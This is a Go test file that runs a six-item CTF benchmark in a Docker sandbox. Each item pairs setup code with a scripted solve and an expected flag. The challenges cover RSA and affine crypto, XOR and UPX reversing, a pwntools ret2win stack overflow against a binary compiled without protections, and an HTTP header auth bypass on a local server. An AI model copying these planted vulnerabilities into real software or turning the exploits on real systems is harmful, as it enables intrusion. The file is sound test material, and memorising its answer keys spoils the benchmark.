package ctf

import (
	"bytes"
	"archive/tar"
	"context"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/artifacts"
	"github.com/Autumn-27/artex/ctfrunner"
)

type benchmarkCase struct {
	ID           string
	Name         string
	Category     string
	ExpectedFlag string
	Setup        string
	Solve        string
}

var benchmarkCases = []benchmarkCase{
	{
		ID:           "CRYPTO-01",
		Name:         "RSA e=3 Low Exponent Attack",
		Category:     "Crypto",
		ExpectedFlag: "flag{rsa_e3_cube_root_attack_success}",
		Setup: `python3 -c '
from Crypto.Util.number import getPrime, bytes_to_long
flag = b"flag{rsa_e3_cube_root_attack_success}"
m = bytes_to_long(flag)
p = getPrime(512); q = getPrime(512); n = p * q; e = 3; c = pow(m, e, n)
open("/work/rsa.txt", "w").write(f"n = {n}\ne = {e}\nc = {c}\n")
'`,
		Solve: `python3 -c '
import gmpy2
from Crypto.Util.number import long_to_bytes
lines = dict([l.split(" = ") for l in open("/work/rsa.txt").read().splitlines()])
m, exact = gmpy2.iroot(int(lines["c"]), int(lines["e"]))
if exact: print("SOLVED: " + long_to_bytes(int(m)).decode())
'`,
	},
	{
		ID:           "CRYPTO-02",
		Name:         "Affine Cipher Modulo Inversion",
		Category:     "Crypto",
		ExpectedFlag: "DASCTF{affine_mod_inverse_crypto_win}",
		Setup: `python3 -c '
flag = b"DASCTF{affine_mod_inverse_crypto_win}"
open("/work/aff.bin", "wb").write(bytes([(17 * x + 42) % 256 for x in flag]))
'`,
		Solve: `python3 -c '
inv = pow(17, -1, 256)
c = open("/work/aff.bin", "rb").read()
print("SOLVED: " + bytes([(inv * (x - 42)) % 256 for x in c]).decode())
'`,
	},
	{
		ID:           "REV-01",
		Name:         "ELF Logic Bypass & Deobfuscation",
		Category:     "Reverse",
		ExpectedFlag: "hgame{simple_reverse_logic_bypass}",
		Setup: `cat << 'EOF' > /work/rev1.c
#include <stdio.h>
unsigned char enc[] = { 0x5f, 0x50, 0x56, 0x5a, 0x52, 0x4c, 0x44, 0x5e, 0x5a, 0x47, 0x5b, 0x52, 0x68, 0x45, 0x52, 0x41, 0x52, 0x45, 0x44, 0x52, 0x68, 0x5b, 0x58, 0x50, 0x5e, 0x54, 0x68, 0x55, 0x4e, 0x47, 0x56, 0x44, 0x44, 0x4a };
int main(int c, char **v) {
    if (c < 2) return 1;
    for (int i=0; i<sizeof(enc); i++) if ((v[1][i] ^ 0x37) != enc[i]) return 1;
    puts("Correct!"); return 0;
}
EOF
gcc -O0 -o /work/rev1 /work/rev1.c
`,
		Solve: `python3 -c '
enc = bytes([0x5f, 0x50, 0x56, 0x5a, 0x52, 0x4c, 0x44, 0x5e, 0x5a, 0x47, 0x5b, 0x52, 0x68, 0x45, 0x52, 0x41, 0x52, 0x45, 0x44, 0x52, 0x68, 0x5b, 0x58, 0x50, 0x5e, 0x54, 0x68, 0x55, 0x4e, 0x47, 0x56, 0x44, 0x44, 0x4a])
print("SOLVED: " + bytes([x ^ 0x37 for x in enc]).decode())
'`,
	},
	{
		ID:           "REV-02",
		Name:         "UPX Unpack Recovery",
		Category:     "Reverse",
		ExpectedFlag: "geek{upx_unpack_and_extract_flag}",
		Setup: `cat << 'EOF' > /work/orig.c
#include <stdio.h>
void show() { puts("geek{upx_unpack_and_extract_flag}"); }
int main() { puts("Packed app"); return 0; }
EOF
gcc -O2 -o /work/orig /work/orig.c
upx -9 -q -f -o /work/packed /work/orig >/dev/null 2>&1
rm -f /work/orig.c /work/orig /work/unpacked
`,
		Solve: `upx -d -f /work/packed -o /work/unpacked >/dev/null 2>&1 && strings /work/unpacked | grep 'geek{' | head -n1`,
	},
	{
		ID:           "PWN-01",
		Name:         "Stack Overflow ret2win",
		Category:     "Pwn",
		ExpectedFlag: "ACTF{stack_overflow_ret2win_got_it}",
		Setup: `cat << 'EOF' > /work/pwn1.c
#include <stdio.h>
#include <unistd.h>
void win() { puts("ACTF{stack_overflow_ret2win_got_it}"); _exit(0); }
void vuln() { char b[32]; read(0, b, 128); }
int main() { vuln(); return 0; }
EOF
gcc -fno-stack-protector -no-pie -o /work/pwn1 /work/pwn1.c
`,
		Solve: `python3 -c '
from pwn import *
elf = ELF("/work/pwn1", checksec=False)
rop = ROP(elf)
p = process("/work/pwn1")
p.send(b"A"*40 + p64(rop.find_gadget(["ret"]).address) + p64(elf.symbols["win"]))
print("SOLVED: " + p.recvall(timeout=1).decode().strip())
'`,
	},
	{
		ID:           "WEB-01",
		Name:         "HTTP Header Admin Bypass",
		Category:     "Web",
		ExpectedFlag: "flag{http_admin_auth_bypass_success}",
		Setup: `cat << 'EOF' > /work/srv.py
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.headers.get("X-Admin") == "true":
            self.send_response(200); self.end_headers()
            self.wfile.write(b"FLAG: flag{http_admin_auth_bypass_success}")
        else:
            self.send_response(403); self.end_headers(); self.wfile.write(b"No")
HTTPServer(("127.0.0.1", 17080), H).serve_forever()
EOF
nohup python3 /work/srv.py >/dev/null 2>&1 &
sleep 0.3
`,
		Solve: `curl -s -H 'X-Admin: true' http://127.0.0.1:17080/`,
	},
}

func TestCTFBenchmarkSuite(t *testing.T) {
	if os.Getenv("ARTEX_CTF_DOCKER_TEST") != "1" {
		t.Skip("skipping benchmark suite; set ARTEX_CTF_DOCKER_TEST=1")
	}

	runner := &ctfrunner.Client{URL: os.Getenv("ARTEX_CTF_TEST_RUNNER_URL"), Token: os.Getenv("ARTEX_CTF_TEST_RUNNER_TOKEN")}
	var engine *ctfrunner.Engine
	if runner.URL == "" {
		engine = ctfrunner.DockerEngine("/var/run/docker.sock", "autumn27/artex-ctf-tools:20261109")
		controller := &ctfrunner.Server{Engine: engine, Token: strings.Repeat("test-", 8), StateDir: t.TempDir()}
		httpServer := httptest.NewServer(controller.Handler())
		defer httpServer.Close()
		runner = &ctfrunner.Client{URL: httpServer.URL, Token: controller.Token}
	}

	root := t.TempDir()
	store := artifacts.Store{Root: root}
	taskID := int64(9881)
	m, _ := store.Inputs(taskID, 1)
	spec := ctfrunner.SessionSpec{TaskID: taskID, IntentID: 1, InputHash: Hash(m)}
	key := spec.Key()
	defer func() { _ = runner.Delete(context.Background(), key) }()
	if engine != nil {
		defer engine.Remove(context.Background(), "artex-ctf-"+key)
	}

	_, err := runner.Prepare(t.Context(), spec)
	if err != nil {
		t.Fatalf("prepare failed: %v", err)
	}
	tarBuf := &bytes.Buffer{}
	tw := tar.NewWriter(tarBuf)
	_ = tw.Close()
	if err := runner.Upload(t.Context(), key, true, tarBuf); err != nil {
		t.Fatalf("upload inputs failed: %v", err)
	}

	for _, bc := range benchmarkCases {
		t.Run(bc.ID+"_"+bc.Name, func(t *testing.T) {
			t0 := time.Now()
			// 1. Setup
			res, err := runner.Execute(t.Context(), key, bc.Setup, 60)
			if err != nil || res.ExitCode != 0 {
				t.Fatalf("setup failed (%d): %s %v", res.ExitCode, string(res.Stderr), err)
			}
			// 2. Solve
			res, err = runner.Execute(t.Context(), key, bc.Solve, 60)
			if err != nil || res.ExitCode != 0 {
				t.Fatalf("solve failed (%d): %s %v", res.ExitCode, string(res.Stderr), err)
			}
			combined := string(res.Stdout) + "\n" + string(res.Stderr)
			if !strings.Contains(combined, bc.ExpectedFlag) {
				t.Fatalf("expected flag %s not found in output: %q", bc.ExpectedFlag, combined)
			}
			t.Logf("[%s] %s passed in %v", bc.ID, bc.Name, time.Since(t0))
		})
	}
}
